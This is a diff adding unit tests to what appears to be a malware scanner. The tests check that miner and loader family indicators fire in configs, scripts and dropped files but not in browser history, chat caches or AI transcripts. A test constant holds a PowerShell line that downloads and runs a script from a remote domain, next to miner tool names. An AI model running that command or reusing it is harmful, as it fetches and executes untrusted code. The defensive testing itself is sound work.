@@ -319,6 +319,54 @@ public class RuleApplicabilityTests
     public void PoolRules_DoNotFire_OnBlocklists(string path, string content) =>
         Assert.DoesNotContain(ScanText(path, content), m => m.Category == "miner");
 
+    // Отчёт полной проверки 1.3.5/1.3.6 (Katana): индикаторы семейств в истории Chrome, кэше Discord и журналах Claude Code —
+    // это упоминания угрозы (пользователь её искал и обсуждал), а не сама угроза.
+    [Theory]
+    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\History")]
+    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\Network Action Predictor")]
+    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\Shortcuts")]
+    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\Favicons")]
+    [InlineData(@"C:\Users\avito\AppData\Roaming\discord\Cache\Cache_Data\data_3")]
+    [InlineData(@"C:\Users\avito\.claude\projects\C--Users-avito--local-bin\450208d7-ca7f-4db7-92ff-3d690a6040e7.jsonl")]
+    [InlineData(@"C:\Users\avito\.claude\file-history\450208d7-ca7f-4db7-92ff-3d690a6040e7\9ef7507ea50a80d2@v2")]
+    [InlineData(@"C:\Users\avito\AppData\Roaming\Mozilla\Firefox\Profiles\x.default\places.sqlite")]
+    [InlineData(@"C:\Users\avito\Documents\notes\THREAT_FAMILIES.md")]
+    public void FamilyIndicators_InHistoryCachesAndTranscripts_AreMentionsNotThreats(string path) =>
+        Assert.DoesNotContain(ScanText(path, FamilyMentions), m => m.Category is "miner" or "loader");
+
+    [Theory]
+    [InlineData(@"C:\ProgramData\CAAService\config.json")]
+    [InlineData(@"C:\Users\avito\AppData\Roaming\svc\start.bat")]
+    [InlineData(@"C:\Users\avito\AppData\Local\Google\Chrome\User Data\Default\cneicjnb.gkn")]
+    [InlineData(@"C:\Windows\System32\Tasks\Office-Persistent-Activation")]
+    public void FamilyIndicators_InConfigsScriptsAndUnknownFiles_StillFire(string path)
+    {
+        var matches = ScanText(path, FamilyMentions);
+        Assert.Contains(matches, m => m.RuleId == "SNT-FAM-CAA-0002");
+        Assert.Contains(matches, m => m.RuleId == "SNT-FAM-TECHIAS-0002");
+    }
+
+    [Theory]
+    [InlineData("cneicjnb.gkn", true)]
+    [InlineData("kyerdwei.xtk", true)]
+    [InlineData("readme12.txt", true)]
+    [InlineData("Settings.dat", false)]
+    [InlineData("cneicjnbx.gkn", false)]
+    [InlineData("CNEICJNB.GKN", false)]
+    public void RandomDropNames(string name, bool expected) => Assert.Equal(expected, ScanTarget.IsRandomDropName(name));
+
+    [Fact]
+    public void ExecutableInBrowserCache_IsStillScanned()
+    {
+        var bytes = System.Text.Encoding.UTF8.GetBytes(FamilyMentions);
+        var matches = new SignatureEngine(RuleLoader.LoadDirectory(RepoPaths.RulesDirectory))
+            .Scan(bytes, bytes.Length, null, new ScanTarget(@"C:\Users\u\AppData\Roaming\discord\Cache\Cache_Data\f_000123", true));
+        Assert.Contains(matches, m => m.RuleId == "SNT-FAM-CAA-0002");
+    }
+
+    private const string FamilyMentions =
+        "pearlhash --algorithm-gpu kryptex.network irm https://activate.techias.co.uk | iex";
+
     private static IReadOnlyList<SignatureMatch> ScanText(string path, string content)
     {
         var bytes = System.Text.Encoding.UTF8.GetBytes(content);
